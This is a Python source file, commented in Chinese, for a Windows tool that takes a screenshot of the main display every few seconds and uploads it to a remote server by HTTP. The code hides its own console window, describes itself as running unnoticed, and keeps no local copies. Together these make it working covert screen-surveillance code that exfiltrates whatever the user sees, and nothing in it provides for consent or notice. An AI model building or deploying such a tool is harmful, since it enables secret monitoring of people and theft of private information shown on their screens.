#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows 自动截图工具
功能：每隔指定时间自动截图并上传到远程服务器
特点：无感运行、轻量级、高稳定性
"""

import os
import sys
import time
import json
import logging
import socket
from abc import ABC, abstractmethod
from datetime import datetime
from io import BytesIO

try:
    import mss
    from PIL import Image
    import requests
except ImportError as e:
    print(f"缺少依赖库: {e}")
    print("请运行: pip install -r requirements.txt")
    sys.exit(1)


# ============================================================================
# 配置加载模块
# ============================================================================

def load_config():
    """加载配置文件"""
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
    
    # 默认配置
    default_config = {
        "server_url": "https://example.com/upload",
        "api_key": "",
        "interval_seconds": 5,
        "jpeg_quality": 70,
        "max_retries": 3,
        "timeout_connect": 5,
        "timeout_read": 10,
        "log_level": "INFO"
    }
    
    # 如果配置文件存在，加载并合并
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except Exception as e:
            logging.warning(f"加载配置文件失败，使用默认配置: {e}")
    else:
        # 创建默认配置文件
        try:
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=4, ensure_ascii=False)
            logging.info(f"已创建默认配置文件: {config_path}")
        except Exception as e:
            logging.warning(f"创建配置文件失败: {e}")
    
    return default_config


# ============================================================================
# 日志配置模块
# ============================================================================

def setup_logging(log_level="INFO"):
    """配置日志系统"""
    log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
    os.makedirs(log_dir, exist_ok=True)
    
    log_file = os.path.join(log_dir, f'screenshot_{datetime.now().strftime("%Y%m%d")}.log')
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper(), logging.INFO),
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8'),
            # 如果是开发模式，也输出到控制台
            # logging.StreamHandler(sys.stdout)
        ]
    )


# ============================================================================
# 截图模块
# ============================================================================

class ScreenCapture:
    """屏幕截图类"""
    
    def __init__(self, jpeg_quality=70):
        self.jpeg_quality = jpeg_quality
        self.sct = None
    
    def __enter__(self):
        self.sct = mss.mss()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.sct:
            self.sct.close()
    
    def capture(self):
        """
        捕获主显示器屏幕
        注意：截图仅在内存中处理，不写入磁盘
        返回: (图片字节数据, 文件名)
        """
        buffer = None
        try:
            # 获取主显示器 (monitor 1 是主显示器)
            monitor = self.sct.monitors[1]
            
            # 截图
            screenshot = self.sct.grab(monitor)
            
            # 转换为PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            
            # 压缩为JPEG（仅在内存中，不写入磁盘）
            buffer = BytesIO()
            img.save(buffer, format='JPEG', quality=self.jpeg_quality, optimize=True)
            image_data = buffer.getvalue()
            
            # 生成文件名：计算机名-年月日时分秒.jpg
            computer_name = socket.gethostname()
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            filename = f"{computer_name}-{timestamp}.jpg"
            
            logging.info(f"截图成功: {filename} ({len(image_data)/1024:.1f} KB)")
            return image_data, filename
            
        except Exception as e:
            logging.error(f"截图失败: {e}", exc_info=True)
            return None, None
        finally:
            # 显式关闭内存缓冲区
            if buffer:
                buffer.close()


# ============================================================================
# 存储后端模块
# ============================================================================

# 导入存储后端模块
try:
    from storage_backends import create_storage_backend
except ImportError:
    # 如果模块不在同一目录，尝试从当前目录导入
    import sys
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from storage_backends import create_storage_backend


# ============================================================================
# 主程序
# ============================================================================

def hide_console():
    """隐藏控制台窗口 (仅Windows)"""
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 
                0  # SW_HIDE
            )
        except Exception as e:
            logging.warning(f"隐藏控制台失败: {e}")


def main():
    """主函数"""
    # 加载配置
    config = load_config()
    
    # 配置日志
    setup_logging(config.get('log_level', 'INFO'))
    
    # 隐藏控制台窗口
    hide_console()
    
    logging.info("=" * 60)
    logging.info("Windows 自动截图工具启动")
    logging.info(f"截图间隔: {config['interval_seconds']} 秒")
    logging.info(f"JPEG质量: {config['jpeg_quality']}%")
    
    # 创建存储后端
    try:
        storage = create_storage_backend(config)
        storage_type = config.get('storage_type', 'http')
        logging.info(f"存储后端: {storage_type.upper()}")
        logging.info("=" * 60)
    except Exception as e:
        logging.error(f"创建存储后端失败: {e}", exc_info=True)
        sys.exit(1)
    
    # 主循环
    try:
        with ScreenCapture(jpeg_quality=config['jpeg_quality']) as capture:
            while True:
                loop_start = time.time()
                
                # 截图（仅在内存中处理）
                image_data, filename = capture.capture()
                
                # 上传并立即清理内存
                if image_data and filename:
                    storage.upload(image_data, filename)
                    # 显式删除图片数据，释放内存（本地不留存）
                    del image_data
                    del filename

                
                # 计算需要等待的时间，确保精确间隔
                elapsed = time.time() - loop_start
                sleep_time = max(0, config['interval_seconds'] - elapsed)
                
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
    except KeyboardInterrupt:
        logging.info("接收到停止信号，程序退出")
    except Exception as e:
        logging.error(f"程序异常退出: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
